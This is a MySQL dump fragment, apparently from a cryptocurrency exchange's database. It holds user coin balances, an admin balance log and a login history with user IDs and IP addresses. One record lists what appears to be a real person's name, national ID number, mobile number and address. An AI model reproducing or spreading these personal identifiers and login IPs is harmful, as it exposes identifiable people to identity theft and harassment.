INSERT INTO `movesay_user_coin` VALUES ('5081', '5081', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5082', '5082', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5083', '5083', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5084', '5084', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5085', '5085', '0.00000000', '0.00000000', 'bd63fc7112f26ffcbcfd5511d0df14f9', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5086', '5086', '20000.00000000', '0.00000000', '', '20000.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5087', '5087', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5088', '5088', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5089', '5089', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5090', '5090', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5091', '5091', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5092', '5092', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5093', '5093', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5094', '5094', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5095', '5095', '100000.00000000', '0.00000000', '8db1190f640b4d4d9bfaf57dc97be408', '10000.00000000', '0.00000000', '', '3001.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5096', '5096', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5097', '5097', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5098', '5098', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5099', '5099', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5100', '5100', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5101', '5101', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5102', '5102', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5103', '5103', '0.00000000', '0.00000000', '0c5d365a6e466390493e626c97c4cdda', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5104', '5104', '0.00000000', '0.00000000', 'aca100cb2c2bdb735becea7e1952dc77', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5105', '5105', '895.00000000', '105.00000000', '61f3f639fc451d2508c1224a4ed2d179', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5106', '5106', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5107', '5107', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5108', '5108', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5109', '5109', '0.00000000', '0.00000000', '7b314f858543a21455b0f2917829400c', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5110', '5110', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5111', '5111', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5112', '5112', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5113', '5113', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5114', '5114', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5115', '5115', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5116', '5116', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5117', '5117', '0.00000000', '0.00000000', 'c2308950df39127e4ce5a64f82580b19', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5118', '5118', '0.00000000', '0.00000000', '992741a782b97c37d68aa9ed0361aed0', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5119', '5119', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5120', '5120', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5121', '5121', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5122', '5122', '0.00000000', '0.00000000', '0f59aca70cdf88c0ec6434d84b1fe58f', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5123', '5123', '0.00000000', '0.00000000', '7737a062b8d722029d78e4e6cbc709f2', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5124', '5124', '0.00000000', '0.00000000', '8a38fd84fd9e4ea7c30a90dae92dee06', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5125', '5125', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5126', '5126', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5127', '5127', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5128', '5128', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5129', '5129', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5130', '5130', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5131', '5131', '0.00000000', '0.00000000', 'f99555f6bc364117e62320c6d7c76cbd', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5132', '5132', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5133', '5133', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5134', '5134', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5135', '5135', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5136', '5136', '0.00000000', '0.00000000', '758da05e41bca79fdc7134f0a15a2d8a', '0.00000000', '0.00000000', '', '3000.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5137', '5137', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5138', '5138', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5139', '5139', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5140', '5140', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '', '0.00000000');
INSERT INTO `movesay_user_coin` VALUES ('5141', '5141', '0.00000000', '0.00000000', '800712ccc26a12e6c510e0394c090567', '0.00000000', '0.00000000', '', '3000.00000000');

-- ----------------------------
-- Table structure for movesay_user_coin_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_coin_log`;
CREATE TABLE `movesay_user_coin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `ofcold` decimal(20,8) NOT NULL,
  `ofcnew` decimal(20,8) NOT NULL,
  `addtime` int(11) NOT NULL,
  `adminid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=110 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of movesay_user_coin_log
-- ----------------------------
INSERT INTO `movesay_user_coin_log` VALUES ('81', '4939', '0.00000000', '0.00000000', '1505407182', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('82', '4939', '0.00000000', '0.00000000', '1505407205', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('83', '4944', '0.00000000', '0.00000000', '1505450801', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('84', '4943', '0.00000000', '0.00000000', '1505450955', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('85', '4946', '0.00000000', '0.00000000', '1505451004', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('86', '4947', '0.00000000', '0.00000000', '1505451088', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('87', '4945', '0.00000000', '0.00000000', '1505451199', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('88', '5022', '0.00000000', '0.00000000', '1505790485', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('89', '5040', '0.00000000', '0.00000000', '1505791197', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('90', '5043', '0.00000000', '0.00000000', '1506054068', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('91', '5042', '0.00000000', '0.00000000', '1506308723', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('92', '5041', '0.00000000', '0.00000000', '1506308861', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('93', '5041', '0.00000000', '0.00000000', '1506308918', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('94', '5045', '0.00000000', '0.00000000', '1506309291', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('95', '5046', '0.00000000', '0.00000000', '1506309385', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('96', '5047', '0.00000000', '0.00000000', '1506309985', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('97', '5048', '0.00000000', '0.00000000', '1506322903', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('98', '5050', '0.00000000', '0.00000000', '1506394115', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('99', '5048', '0.00000000', '0.00000000', '1506394897', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('100', '5050', '0.00000000', '0.00000000', '1506397244', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('101', '5050', '0.00000000', '0.00000000', '1506397889', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('102', '5050', '0.00000000', '0.00000000', '1506397928', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('103', '5048', '0.00000000', '0.00000000', '1506397949', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('104', '5051', '0.00000000', '0.00000000', '1506480730', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('105', '5086', '0.00000000', '0.00000000', '1514876185', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('106', '5058', '0.00000000', '0.00000000', '1514876222', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('107', '5095', '0.00000000', '0.00000000', '1515411011', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('108', '5095', '0.00000000', '0.00000000', '1515489715', '1');
INSERT INTO `movesay_user_coin_log` VALUES ('109', '5105', '0.00000000', '0.00000000', '1516953663', '1');

-- ----------------------------
-- Table structure for movesay_user_goods
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_goods`;
CREATE TABLE `movesay_user_goods` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(200) NOT NULL,
  `truename` varchar(200) NOT NULL,
  `idcard` varchar(200) NOT NULL,
  `moble` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=101 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_goods
-- ----------------------------
INSERT INTO `movesay_user_goods` VALUES ('100', '5021', '李树山', '李树山', '341181197709290215', '13514902888', '安徽省天长市', '0', '1505473329', '0', '1');

-- ----------------------------
-- Table structure for movesay_user_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_log`;
CREATE TABLE `movesay_user_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(200) NOT NULL,
  `en_type` varchar(200) DEFAULT NULL,
  `remark` varchar(200) NOT NULL,
  `en_remark` varchar(200) DEFAULT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `en_addr` varchar(200) DEFAULT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=848377 DEFAULT CHARSET=utf8 COMMENT='用户记录表';

-- ----------------------------
-- Records of movesay_user_log
-- ----------------------------
INSERT INTO `movesay_user_log` VALUES ('848049', '4887', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.118.224', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505280502', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848050', '4886', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.118.224', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505310946', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848051', '4886', '登录', 'Login', '通过用户名登录', 'Login by account', '113.108.11.50', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505324461', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848052', '4888', '登录', 'Login', '通过用户名登录', 'Login by account', '183.161.251.160', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505355266', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848053', '4888', '登录', 'Login', '通过用户名登录', 'Login by account', '183.161.251.160', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505355322', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848054', '4891', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.147.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505377942', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848055', '4889', '登录', 'Login', '通过用户名登录', 'Login by account', '223.215.18.85', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505377966', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848056', '4891', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.147.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505378129', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848057', '4889', '登录', 'Login', '通过用户名登录', 'Login by account', '223.215.18.85', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505378677', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848058', '4898', '登录', 'Login', '通过用户名登录', 'Login by account', '111.30.131.212', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505379752', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848059', '4890', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.93.201', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505379970', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848060', '4890', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.93.201', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505380320', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848061', '4896', '登录', 'Login', '通过手机号登录', 'Login by phone', '123.151.43.126', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381159', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848062', '4891', '登录', 'Login', '通过用户名登录', 'Login by account', '123.151.138.60', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381418', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848063', '4909', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.147.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381438', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848064', '4908', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.114', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381702', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848065', '4908', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.114', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381706', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848066', '4891', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.147.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381713', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848067', '4908', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.114', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505381746', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848068', '4911', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.147.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505382595', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848069', '4909', '登录', 'Login', '通过用户名登录', 'Login by account', '123.151.152.241', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505385197', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848070', '4910', '登录', 'Login', '通过手机号登录', 'Login by phone', '120.193.252.51', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505386216', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848071', '4917', '登录', 'Login', '通过用户名登录', 'Login by account', '183.204.103.250', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505386646', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848072', '4889', '登录', 'Login', '通过用户名登录', 'Login by account', '36.6.221.249', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505386719', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848073', '4910', '登录', 'Login', '通过手机号登录', 'Login by phone', '120.193.252.51', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505387762', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848074', '4905', '登录', 'Login', '通过用户名登录', 'Login by account', '183.205.134.186', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505387798', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848075', '4921', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.18', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505387894', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848076', '4905', '登录', 'Login', '通过用户名登录', 'Login by account', '183.205.134.186', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505387935', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848077', '4905', '登录', 'Login', '通过用户名登录', 'Login by account', '183.205.134.186', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505388170', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848078', '4923', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.146.171', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505389782', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848079', '4923', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.146.171', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505389967', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848080', '4923', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.146.171', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505390204', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848081', '4925', '登录', 'Login', '通过用户名登录', 'Login by account', '14.17.37.144', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505390757', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848082', '4911', '登录', 'Login', '通过用户名登录', 'Login by account', '1.195.248.73', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505392195', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848083', '4892', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.146.171', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505392430', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848084', '4923', '登录', 'Login', '通过用户名登录', 'Login by account', '61.158.146.171', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505394458', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848085', '4926', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.120', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505394661', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848086', '4927', '登录', 'Login', '通过邮箱登录', 'Login by email', '123.151.138.57', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505395002', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848087', '4909', '登录', 'Login', '通过用户名登录', 'Login by account', '123.151.152.241', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505400790', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848088', '4916', '登录', 'Login', '通过用户名登录', 'Login by account', '182.46.10.146', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505401567', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848089', '4889', '登录', 'Login', '通过用户名登录', 'Login by account', '36.6.221.249', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505401738', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848090', '4886', '登录', 'Login', '通过用户名登录', 'Login by account', '113.108.11.50', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505408450', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848091', '4905', '登录', 'Login', '通过用户名登录', 'Login by account', '223.104.105.166', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505410918', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848092', '4941', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505412388', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848093', '4942', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505413321', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848094', '4942', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505413718', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848095', '4942', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505413942', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848096', '4941', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505414169', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848097', '4943', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505414649', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848098', '4944', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505414971', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848099', '4945', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505415498', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848100', '4946', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505415869', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848101', '4947', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505416406', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848102', '4947', '登录', 'Login', '通过用户名登录', 'Login by account', '182.97.222.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505416883', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848103', '4948', '登录', 'Login', '通过用户名登录', 'Login by account', '14.152.68.185', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505429923', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848104', '4950', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.114', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505431645', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848105', '4949', '登录', 'Login', '通过用户名登录', 'Login by account', '14.152.68.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505431660', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848106', '4949', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.114', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505431910', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848107', '4890', '登录', 'Login', '通过用户名登录', 'Login by account', '123.151.42.47', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505431976', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848108', '4951', '登录', 'Login', '通过用户名登录', 'Login by account', '60.167.60.28', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505432252', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848109', '4889', '登录', 'Login', '通过用户名登录', 'Login by account', '223.215.18.85', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505434729', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848110', '4953', '登录', 'Login', '通过用户名登录', 'Login by account', '36.149.137.138', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505435915', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848111', '4906', '登录', 'Login', '通过用户名登录', 'Login by account', '125.105.98.40', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505435953', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848112', '4926', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.120', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505436058', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848113', '4958', '登录', 'Login', '通过用户名登录', 'Login by account', '115.60.139.174', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505436996', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848114', '4928', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.117', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505437667', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848115', '4954', '登录', 'Login', '通过用户名登录', 'Login by account', '14.17.3.122', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505437761', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848116', '4957', '登录', 'Login', '通过用户名登录', 'Login by account', '113.128.78.150', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505438302', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848117', '4959', '登录', 'Login', '通过用户名登录', 'Login by account', '101.226.125.18', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505438415', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848118', '4954', '登录', 'Login', '通过用户名登录', 'Login by account', '14.17.3.122', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505438740', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848119', '4904', '登录', 'Login', '通过手机号登录', 'Login by phone', '118.212.200.46', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1505438763', '0', '1');
